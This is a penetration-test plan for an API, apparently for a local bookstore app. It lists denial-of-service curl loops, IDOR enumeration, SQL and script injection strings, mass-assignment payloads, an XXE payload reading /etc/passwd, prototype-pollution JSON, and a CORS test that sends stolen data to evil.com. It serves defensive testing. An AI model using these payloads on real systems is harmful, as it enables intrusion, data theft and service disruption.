# 🔌 API Abuse Hell Tests

## 1. Rate Limiting Attacks

### TEST-API-001: Endpoint Flood
**Goal**: Overwhelm server with requests
```bash
# Hammer endpoints with requests
for i in {1..10000}; do
  curl -X GET "http://api.azbooks.local/api/products/" &
done

Expected: Rate limiting kicks in after ~100 requests
Evil Expected: Server crashes or slows to crawl
```

### TEST-API-002: Different Endpoint Round Robin
**Goal**: Bypass per-endpoint rate limits
```
Steps:
1. Hit /api/products/ 100 times (rate limited)
2. Switch to /api/customers/ 100 times
3. Switch to /api/orders/ 100 times
4. Check: Global rate limit or per-endpoint?

Expected: Global user rate limit
Evil Expected: Only per-endpoint → DoS possible
```

### TEST-API-003: Authentication Failure Flood
**Goal**: Lock out legitimate users
```bash
# Flood with wrong passwords
for i in {1..1000}; do
  curl -X POST "http://api/login/" -d '{"username":"admin","password":"wrong"}' &
done

Expected: Attacker IP blocked, not user account
Evil Expected: User account locked, attacker wins
```

---

## 2. IDOR (Insecure Direct Object Reference)

### TEST-API-004: Sequential ID Enumeration
**Goal**: Access all records by guessing IDs
```bash
# If display IDs are sequential:
for id in {1000..2000}; do
  curl -H "Auth: valid_token" "http://api/orders/$id/"
done

Expected: Only own orders accessible
Evil Expected: All orders accessible
```

### TEST-API-005: UUID Guessing
**Goal**: Access via UUID manipulation
```
Steps:
1. Get valid UUID for your order: 550e8400-e29b-41d4-a716-446655440000
2. Modify last digits: 550e8400-e29b-41d4-a716-446655440001
3. Request that order
4. Check: Authorization enforced?

Expected: 403 Forbidden
Evil Expected: Data returned
```

### TEST-API-006: Bulk IDOR via Filter
**Goal**: Access restricted data via include filter
```
Request:
GET /api/orders/?customer_id=all
GET /api/orders/?include_deleted=true
GET /api/orders/?show_all_users=1

Expected: Filters sanitized
Evil Expected: Admin-only filters work for regular users
```

---

## 3. Parameter Pollution

### TEST-API-007: Duplicate Parameter Confusion
**Goal**: Confuse server with duplicate params
```
Requests:
GET /api/products/?price=100&price=1
POST /api/orders/ {"amount": 100, "amount": 1}
GET /api/orders/?status=delivered&status=pending

Expected: First or last value used consistently
Evil Expected: Different values used for different checks
```

### TEST-API-008: Array Parameter Abuse
**Goal**: Inject via array syntax
```
Requests:
GET /api/products/?id[]=1&id[]=2&id[]='OR 1=1
GET /api/orders/?status[0]=active&status[1]=<script>
POST /api/users/ {"roles": ["admin", "superadmin"]}

Expected: Array inputs validated
Evil Expected: Injection or privilege escalation
```

### TEST-API-009: Parameter Type Juggling
**Goal**: Confuse type checking
```
Valid: {"quantity": 5}
Attacks:
{"quantity": "5"}
{"quantity": ["5"]}
{"quantity": {"value": 5}}
{"quantity": true}
{"quantity": null}

Expected: Strict type checking
Evil Expected: Type coercion causes unexpected behavior
```

---

## 4. Mass Assignment

### TEST-API-010: Add Admin Fields
**Goal**: Set fields that shouldn't be user-controlled
```
POST /api/users/register/
{
  "username": "attacker",
  "password": "password123",
  "is_admin": true,
  "is_superuser": true,
  "role": "admin"
}

Expected: Extra fields ignored
Evil Expected: User becomes admin
```

### TEST-API-011: Modify Read-Only Fields
**Goal**: Change calculated/system fields
```
PATCH /api/orders/123/
{
  "total": 1.00,
  "created_at": "2020-01-01",
  "created_by": "another_user"
}

Expected: Read-only fields rejected
Evil Expected: System fields modifiable
```

### TEST-API-012: Nested Object Mass Assignment
**Goal**: Inject via nested relationships
```
PATCH /api/orders/123/
{
  "customer": {
    "wallet_balance": 10000,
    "is_vip": true
  }
}

Expected: Nested updates blocked or validated
Evil Expected: Customer data modified via order
```

---

## 5. GraphQL-Specific (if applicable)

### TEST-API-013: Introspection Attack
**Goal**: Discover entire API schema
```graphql
query {
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}

Expected: Introspection disabled in production
Evil Expected: Full schema exposed
```

### TEST-API-014: Deep Query Attack
**Goal**: Expensive recursive queries
```graphql
query {
  orders {
    customer {
      orders {
        customer {
          orders {
            # ... 100 levels deep
          }
        }
      }
    }
  }
}

Expected: Query depth limit
Evil Expected: Server timeout/crash
```

---

## 6. Versioning Attacks

### TEST-API-015: Old Version Exploitation
**Goal**: Use deprecated API versions
```
Requests:
GET /api/v1/users/  (old, vulnerable)
GET /api/v2/users/  (new, patched)

Expected: Old versions disabled or rate-limited
Evil Expected: Old vulnerable endpoints still work
```

### TEST-API-016: Version Header Manipulation
**Goal**: Access future API versions
```
Headers:
X-API-Version: 99
Accept-Version: beta
API-Version: internal

Expected: Invalid versions rejected
Evil Expected: Access to unreleased features
```

---

## 7. Serialization Attacks

### TEST-API-017: XML External Entity (XXE)
**Goal**: If XML accepted, extract server files
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<order>
  <note>&xxe;</note>
</order>

Expected: XML parsing secured, no external entities
Evil Expected: Server files exposed
```

### TEST-API-018: JSON Injection
**Goal**: Break JSON parsing
```
Payloads:
{"name": "test\u0000malicious"}
{"name": "test","__proto__": {"admin": true}}
{"name": {"toString": {"__proto__": {"admin": true}}}}

Expected: Proper JSON handling
Evil Expected: Prototype pollution
```

### TEST-API-019: Large Payload Attack
**Goal**: Crash via huge request body
```bash
# Generate 1GB JSON
python -c "print('{\"data\":\"' + 'A'*1073741824 + '\"}')" | curl -X POST -d @- http://api/endpoint

Expected: Request size limit enforced
Evil Expected: Memory exhaustion
```

---

## 8. CORS Misconfiguration

### TEST-API-020: Cross-Origin Request
**Goal**: Access API from malicious domain
```javascript
// From evil.com:
fetch('https://api.azbooks.local/api/users/me', {
  credentials: 'include'
}).then(r => r.json()).then(data => {
  // Send stolen data to attacker
  fetch('https://evil.com/steal?d=' + JSON.stringify(data));
});

Expected: CORS blocks request
Evil Expected: Data accessible cross-origin
```

### TEST-API-021: Null Origin Attack
**Goal**: Bypass CORS with null origin
```javascript
// Request from file:// or sandboxed iframe has null origin
Origin: null

If server: Access-Control-Allow-Origin: null
Then credentials can be stolen

Expected: Null origin not allowed
Evil Expected: Null origin whitelisted
```

---

## 9. Error Information Disclosure

### TEST-API-022: Detailed Error Messages
**Goal**: Extract server info from errors
```
Trigger errors:
- Invalid SQL → Database type, table names
- Division by zero → Stack trace, file paths
- Missing import → Python version, dependencies
- Invalid auth → Different error for wrong user vs wrong password

Expected: Generic error messages
Evil Expected: Detailed stack traces, paths, DB queries
```

### TEST-API-023: HTTP Method Probing
**Goal**: Discover supported methods
```bash
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  curl -X $method http://api/users/ -o /dev/null -w "%{http_code} "
done

Expected: 405 Method Not Allowed with no details
Evil Expected: Server reveals why method rejected
```

---

## 🌐 BROWSER TEST SCENARIOS

### BROWSER-API-001: Network Tab Inspection
```javascript
Test Steps:
1. Open DevTools → Network
2. Perform all app actions
3. Inspect each API call
Questions:
- Are sensitive fields exposed in responses?
- Are JWT tokens visible?
- Is debug info in headers?
```

### BROWSER-API-002: Request Modification
```javascript
Test Steps:
1. Complete action, capture in Network tab
2. Right-click → Copy as cURL
3. Modify parameters
4. Execute in terminal
Question: Can you bypass frontend validation?
```

### BROWSER-API-003: WebSocket Hijacking (if used)
```javascript
// If app uses WebSocket:
const ws = new WebSocket('wss://api.azbooks.local/ws');
ws.onmessage = (e) => console.log('Intercepted:', e.data);
// Can unauthenticated connections receive data?
```

### BROWSER-API-004: API Response Caching
```javascript
Test Steps:
1. Login as User A, view data
2. Logout, login as User B
3. Navigate back (browser cache)
Question: Is User A's data visible to User B?
```

---

## Test Execution Checklist

| Test ID | Status | Bug Found? | Severity |
|---------|--------|------------|----------|
| TEST-API-001 | ⬜ | | |
| TEST-API-002 | ⬜ | | |
| TEST-API-003 | ⬜ | | |
| TEST-API-004 | ⬜ | | |
| TEST-API-005 | ⬜ | | |
| TEST-API-006 | ⬜ | | |
| TEST-API-007 | ⬜ | | |
| TEST-API-008 | ⬜ | | |
| TEST-API-009 | ⬜ | | |
| TEST-API-010 | ⬜ | | |
| TEST-API-011 | ⬜ | | |
| TEST-API-012 | ⬜ | | |
| TEST-API-013 | ⬜ | | |
| TEST-API-014 | ⬜ | | |
| TEST-API-015 | ⬜ | | |
| TEST-API-016 | ⬜ | | |
| TEST-API-017 | ⬜ | | |
| TEST-API-018 | ⬜ | | |
| TEST-API-019 | ⬜ | | |
| TEST-API-020 | ⬜ | | |
| TEST-API-021 | ⬜ | | |
| TEST-API-022 | ⬜ | | |
| TEST-API-023 | ⬜ | | |
